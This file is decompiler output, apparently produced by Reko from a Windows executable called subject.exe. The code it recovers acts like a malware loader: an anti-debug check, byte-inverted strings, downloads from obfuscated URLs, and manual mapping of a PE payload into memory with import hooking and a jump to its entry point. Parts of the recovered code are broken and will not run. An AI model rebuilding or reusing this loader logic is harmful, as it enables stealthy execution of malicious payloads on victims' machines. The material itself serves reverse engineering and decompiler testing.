// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 003E1000: Register word32 fn003E1000(Stack word32 dwArg04)
word32 fn003E1000(word32 dwArg04)
{
	return dwArg04 + dwArg04->dw003C / 0x0040;
}

// 003E101E: void fn003E101E(Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn003E101E(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	fn003E1EA7(dwArg08, dwArg04, dwArg0C);
	VirtualProtect(dwArg08, dwArg0C, 0x02, fp - 0x08);
	return;
}

// 003E10B2: Register Eq_32 fn003E10B2(Stack Eq_33 dwArg04, Stack Eq_34 dwArg08, Stack word32 dwArg0C)
FARPROC fn003E10B2(HMODULE dwArg04, LPCSTR dwArg08, word32 dwArg0C)
{
	Eq_32 eax_44;
	Eq_32 eax_21 = GetProcAddress(dwArg04, dwArg0C);
	if (fn003E1F8E(dwArg08, 0x003E3050) == 0x00)
	{
		if (fn003E1F12(0x003E3050, dwArg0C, 0x003E3060) == 0x00)
		{
			globals->t3E9A10 = eax_21;
			eax_44 = (Eq_32) &globals->t3E1050;
			return eax_44;
		}
		if (fn003E1F12(0x003E3060, dwArg0C, 0x003E3074) == 0x00)
		{
			globals->t3E9A14 = eax_21;
			eax_44 = (Eq_32) &globals->t3E1082;
			return eax_44;
		}
	}
	eax_44 = eax_21;
	return eax_44;
}

// 003E1125: Register byte fn003E1125(Stack word32 dwArg04)
byte fn003E1125(word32 dwArg04)
{
	return (byte) (-(dwArg04 & 0x80000000) == 0x00);
}

// 003E1139: void fn003E1139(Stack (ptr Eq_85) dwArg04, Stack word32 dwArg08)
void fn003E1139(Eq_85 * dwArg04, word32 dwArg08)
{
	globals->t3E9A18 = GetModuleHandleA(null);
	globals->dw3E9A1C = dwArg08;
	struct Eq_97 * dwLoc08_219 = dwArg08 + dwArg04->dw0080;
	while (dwLoc08_219->dw000C != 0x00)
	{
		ui32 * dwLoc10_121;
		Eq_34 ecx_87 = dwArg08 + dwLoc08_219->dw000C;
		Eq_33 eax_92 = LoadLibraryA(ecx_87);
		if (dwLoc08_219->dw0004 == 0x00)
			dwLoc10_121 = dwArg08 + dwLoc08_219->dw0010;
		else
			dwLoc10_121 = dwArg08 + dwLoc08_219->dw0000;
		word32 * dwLoc18_107 = dwArg08 + dwLoc08_219->dw0010;
		while (*dwLoc10_121 != 0x00)
		{
			Eq_32 dwLoc14_152;
			if ((word32) fn003E1125(*dwLoc10_121) != 0x00)
				dwLoc14_152 = GetProcAddress(eax_92, (word32) (word16) (*dwLoc10_121 & 0xFFFF));
			else
				dwLoc14_152 = fn003E10B2(eax_92, ecx_87, dwArg08 + *dwLoc10_121 + 0x02);
			*dwLoc18_107 = (word32) dwLoc14_152;
			dwLoc18_107 = dwLoc18_107 + 0x01;
			dwLoc10_121 = dwLoc10_121 + 0x01;
		}
		dwLoc08_219 = dwLoc08_219 + 0x01;
	}
	return;
}

// 003E1270: void fn003E1270(Register ui32 ecx, Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn003E1270(ui32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	if (ReadFile(dwArg04, dwArg08, dwArg0C - (ecx & 0x00), fp - 0x08, null) != 0x00)
	{
		if ((ecx & 0x00) != dwArg0C)
			goto l003E1278;
	}
	return;
}

// 003E12A7: void fn003E12A7(Register ui32 ecx, Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn003E12A7(ui32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	if (WriteFile(dwArg04, dwArg08, dwArg0C - (ecx & 0x00), fp - 0x08, null) != 0x00)
	{
		if ((ecx & 0x00) != dwArg0C)
			goto l003E12AF;
	}
	return;
}

// 003E12DF: void fn003E12DF(Register ui32 ecx, Stack ptr32 dwArg04, Stack word32 dwArg08, Stack uint32 dwArg0C)
void fn003E12DF(ui32 ecx, ptr32 dwArg04, word32 dwArg08, uint32 dwArg0C)
{
	uint32 dwLoc08_10 = ecx & 0x00;
	while (dwLoc08_10 < dwArg0C)
	{
		fn003E12A7(dwArg08, dwArg04->dw0004, dwArg08 + dwLoc08_10 * 0x04, 0x08);
		fn003E1270(dwArg08, dwArg04->dw0000, dwArg08 + dwLoc08_10 * 0x04, 0x08);
		dwLoc08_10 = dwLoc08_10 + 0x02;
	}
	return;
}

// 003E1424: void fn003E1424(Stack ptr32 dwArg04)
void fn003E1424(ptr32 dwArg04)
{
	CloseHandle(dwArg04->t0000);
	CloseHandle(dwArg04->t0004);
	return;
}

// 003E1440: Register word32 fn003E1440(Register ui32 ecx)
word32 fn003E1440(ui32 ecx)
{
	struct Eq_280 * eax_16 = fn003E1B30()->ptr0030;
	if ((word32) eax_16->b0002 == 0x00)
	{
		globals->dw411056 = 30301;
		globals->dw41105A = 5484;
		globals->dw41105E = 0x727A;
		globals->dw411062 = 8655;
		if (CreatePipe(fp - 0x24, fp - 0x14, null, 0x10) != 0x00)
		{
			if (CreatePipe(fp - 0x18, fp - 0x20, null, 0x10) != 0x00)
			{
				Eq_189 eax_111 = CreateThread(null, 0x00, &globals->t3E1333, fp - 0x24, 0x00, fp - 0x0C);
				fn003E12DF(ecx, fp - 0x18, 0x003E4000, globals->dw3E9A03 >> 0x02);
				fn003E1424(fp - 0x18);
				fn003E1424(fp - 0x24);
				CloseHandle(eax_111);
				struct Eq_85 * eax_147 = fn003E1000(0x003E4000);
				if (eax_147 != null)
				{
					word32 v14_172 = eax_147->dw0034;
					fn003E101E(0x003E4000, v14_172, eax_147->dw0054);
					fn003E1B40(eax_147, 0x003E4000, v14_172);
					struct Eq_85 * eax_202 = fn003E1000(v14_172);
					if (eax_202 != null)
					{
						fn003E1139(eax_202, v14_172);
						fn003E1CD1(eax_202, v14_172);
						eax_16->dw0008 = v14_172;
						<anonymous> * ecx_245 = v14_172 + eax_147->dw0028;
						word32 esp_248;
						word32 ebp_249;
						byte SCZO_250;
						word32 eax_251;
						byte SZO_252;
						byte C_253;
						byte Z_254;
						word32 ecx_255;
						ecx_245();
					}
				}
			}
		}
	}
	return 0x00;
}

// 003E15B4: void fn003E15B4(Register ui32 ecx, Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn003E15B4(ui32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	ptr32 esp_19 = fp - 0x0C;
	ui32 dwLoc0C_12 = ecx & 0x00;
	while (true)
	{
		ptr32 * esp_21 = esp_19 - 0x04;
		*esp_21 = fp - 0x08;
		*(esp_21 - 0x04) = dwArg0C;
		*(esp_21 - 0x04) = *(esp_21 - 0x04) - dwLoc0C_12;
		word32 eax_34 = dwArg08 + dwLoc0C_12;
		*(esp_21 - 0x08) = eax_34;
		*(esp_21 - 0x0C) = dwArg04;
		word32 ebp_43;
		word32 ecx_44;
		byte SZO_45;
		byte C_46;
		word32 eax_47;
		byte SCZO_48;
		byte Z_49;
		WININET.dll!InternetReadFile();
		if (eax_47 == 0x00)
			break;
		if ((ecx & 0x00) == 0x00)
			break;
		dwLoc0C_12 = dwLoc0C_12 + (ecx & 0x00);
	}
	*(esp_19 - 0x04) = dwLoc0C_12;
	return;
}

// 003E15FA: void fn003E15FA(Stack ptr32 dwArg04)
void fn003E15FA(ptr32 dwArg04)
{
	while ((word32) *dwArg04 != 0x00)
	{
		*dwArg04 = (byte) (0xFF - (word32) (*dwArg04));
		dwArg04 = dwArg04 + 0x01;
	}
	return;
}

// 003E1678: Register word32 fn003E1678(Register ptr32 ebp)
word32 fn003E1678(ptr32 ebp)
{
	fn003E1DDA();
	fn003E15FA(fp - 0x54);
	fn003E15FA(fp - 0x80);
	fn003E15FA(fp - 0x9C);
	word32 ebp_311;
	byte SCZO_312;
	word32 ecx_313;
	word32 eax_314;
	byte Z_315;
	byte SZO_316;
	byte C_317;
	byte SO_318;
	ptr32 esp_310;
	WININET.dll!InternetOpenA();
	if (fp != 0x54)
	{
		int32 dwLocA0_344 = dwLocA0 & 0x00;
		while (dwLocA0_344 < 0x02)
		{
			ptr32 dwLocB0_361;
			if (dwLocA0_344 == 0x00)
				dwLocB0_361 = fp - 0x80;
			else
				dwLocB0_361 = fp - 0x9C;
			word32 * esp_362 = esp_310 - 0x04;
			*esp_362 = 0x00;
			*(esp_362 - 0x04) = 0x04083000;
			*(esp_362 - 0x08) = 0x00;
			*(esp_362 - 0x0C) = 0x00;
			*(esp_362 - 0x10) = dwLocB0_361;
			*(esp_362 - 0x14) = fp - 0x54;
			word32 ebp_379;
			byte SCZO_380;
			ui32 ecx_381;
			word32 eax_382;
			byte Z_383;
			byte SZO_384;
			byte C_385;
			byte SO_386;
			WININET.dll!InternetOpenUrlA();
			if (eax_382 != 0x00)
			{
				*(esp_310 - 0x04) = 0x1000;
				*(esp_310 - 0x08) = 0x00;
				*(esp_310 - 0x0C) = eax_382;
				fn003E15B4(ecx_381, dwArg00, dwArg04, dwArg08);
				*(esp_310 - 0x04) = eax_382;
				word32 ebp_420;
				byte SCZO_421;
				word32 ecx_422;
				word32 eax_423;
				byte Z_424;
				byte SZO_425;
				byte C_426;
				byte SO_427;
				WININET.dll!InternetCloseHandle();
			}
			dwLocA0_344 = dwLocA0_344 + 0x01;
		}
		ptr32 * esp_433 = esp_310 - 0x04;
		*esp_433 = fp - 0x54;
		word32 ebp_436;
		byte SCZO_437;
		word32 ecx_438;
		word32 eax_439;
		byte Z_440;
		byte SZO_441;
		byte C_442;
		byte SO_443;
		WININET.dll!InternetCloseHandle();
	}
	word32 * esp_337 = esp_310 - 0x04;
	*esp_337 = 0x00;
	fn003E1DE1();
	return *esp_337;
}

// 003E1B12: Register Eq_25 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	ExitProcess(fn003E1440(fn003E1678(fp - 0x04)));
}

// 003E1B30: Register word32 fn003E1B30()
word32 fn003E1B30()
{
	return fs->dw0018;
}

// 003E1B40: void fn003E1B40(Stack (ptr Eq_85) dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn003E1B40(Eq_85 * dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word16 ax_17 = dwArg04->w0006;
	cui16 wLoc14_114 = wLoc14 & 0x00;
	while ((word32) wLoc14_114 < (word32) ax_17)
	{
		Eq_16 dwLoc2C_120;
		Eq_16 eax_60 = (&dwArg04->w0006 + 121)[((word32) wLoc14_114 *s 0x28 + 0x08) / 0x08];
		Eq_16 eax_69 = (&dwArg04->w0006 + 121)[((word32) wLoc14_114 *s 0x28 + 0x10) / 0x08];
		if (eax_60 < eax_69)
			dwLoc2C_120 = eax_60;
		else
			dwLoc2C_120 = eax_69;
		fn003E1EA7(dwArg0C + Mem0[((word32) wLoc14_114 *s 0x28 + 0x0C) + (dwArg04 + 0xF8):word32], dwArg08 + Mem0[((word32) wLoc14_114 *s 0x28 + 0x14) + (dwArg04 + 0xF8):word32], dwLoc2C_120);
		wLoc14_114 = wLoc14_114 + 0x01;
	}
	return;
}

// 003E1C09: Register ui32 fn003E1C09(Register Eq_750 ecx, Stack word32 dwArg04)
ui32 fn003E1C09(Eq_750 ecx, word32 dwArg04)
{
	ui32 dwLoc08_10 = ecx & 0x00;
	if ((dwArg04 & 0x04000000) != 0x00)
		dwLoc08_10 = ecx & 0x00 | 0x0200;
	ui32 dwLoc08_115;
	if ((dwArg04 & 0x20000000) != 0x00)
	{
		if ((dwArg04 & 0x40000000) != 0x00)
		{
			if ((dwArg04 & 0x80000000) != 0x00)
				dwLoc08_115 = dwLoc08_10 | 0x40;
			else
				dwLoc08_115 = dwLoc08_10 | 0x20;
		}
		else if ((dwArg04 & 0x80000000) != 0x00)
			dwLoc08_115 = dwLoc08_10 | 0x80;
		else
			dwLoc08_115 = dwLoc08_10 | 0x10;
	}
	else if ((dwArg04 & 0x40000000) != 0x00)
	{
		if ((dwArg04 & 0x80000000) != 0x00)
			dwLoc08_115 = dwLoc08_10 | 0x04;
		else
			dwLoc08_115 = dwLoc08_10 | 0x02;
	}
	else if ((dwArg04 & 0x80000000) != 0x00)
		dwLoc08_115 = dwLoc08_10 | 0x08;
	else
		dwLoc08_115 = dwLoc08_10 | 0x01;
	return dwLoc08_115;
}

// 003E1CD1: void fn003E1CD1(Stack (ptr Eq_85) dwArg04, Stack word32 dwArg08)
void fn003E1CD1(Eq_85 * dwArg04, word32 dwArg08)
{
	word16 ax_17 = dwArg04->w0006;
	cui16 wLoc14_23 = wLoc14 & 0x00;
	while ((word32) wLoc14_23 < (word32) ax_17)
	{
		VirtualProtect(dwArg08 + Mem0[((word32) wLoc14_23 *s 0x28 + 0x0C) + (dwArg04 + 0xF8):word32], Mem0[(word32) wLoc14_23 *s 0x28 + 0x08 + (dwArg04 + 0xF8):word32], fn003E1C09(dwArg04 + 0xF8, Mem0[(word32) wLoc14_23 *s 0x28 + 0x24 + (dwArg04 + 0xF8):word32]), fp - 0x18);
		wLoc14_23 = wLoc14_23 + 0x01;
	}
	return;
}

// 003E1D70: Register int32 fn003E1D70(Stack word32 dwArg04)
int32 fn003E1D70(word32 dwArg04)
{
	int32 eax_11;
	if (dwArg04 >= 0x41 && dwArg04 <= 0x5A)
		eax_11 = dwArg04 + 0x20;
	else
		eax_11 = dwArg04;
	return eax_11;
}

// 003E1DDA: void fn003E1DDA()
void fn003E1DDA()
{
	return;
}

// 003E1DE1: void fn003E1DE1()
void fn003E1DE1()
{
	return;
}

// 003E1EA7: void fn003E1EA7(Stack Eq_14 dwArg04, Stack word32 dwArg08, Stack Eq_16 dwArg0C)
void fn003E1EA7(LPVOID dwArg04, word32 dwArg08, SIZE_T dwArg0C)
{
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		*dwArg04 = *dwArg08;
		dwArg04 = dwArg04 + 0x01;
		dwArg08 = dwArg08 + 0x01;
	}
	return;
}

// 003E1F12: Register int32 fn003E1F12(Register word32 ecx, Stack Eq_34 dwArg04, Stack word32 dwArg08)
int32 fn003E1F12(word32 ecx, LPCSTR dwArg04, word32 dwArg08)
{
	while (true)
	{
		int32 eax_31 = (word32) *dwArg04 - (word32) (*dwArg08);
		int32 dwLoc08_34 = eax_31;
		if (eax_31 != 0x00 || (int32) (*dwArg08) == 0x00)
			break;
		dwArg04 = dwArg04 + 0x01;
		dwArg08 = dwArg08 + 0x01;
	}
	if (eax_31 < 0x00)
		dwLoc08_34 = eax_31 | ~0x00;
	else if (eax_31 > 0x00)
		dwLoc08_34 = 0x01;
	return dwLoc08_34;
}

// 003E1F8E: Register word32 fn003E1F8E(Stack word32 dwArg04, Stack word32 dwArg08)
word32 fn003E1F8E(word32 dwArg04, word32 dwArg08)
{
	do
	{
		word32 eax_23 = fn003E1D70((word32) *dwArg04);
		dwArg04 = dwArg04 + 0x01;
		word32 eax_37 = fn003E1D70((word32) *dwArg08);
		dwArg08 = dwArg08 + 0x01;
	} while (eax_23 == 0x00 || eax_23 != eax_37);
	return eax_23 - eax_37;
}

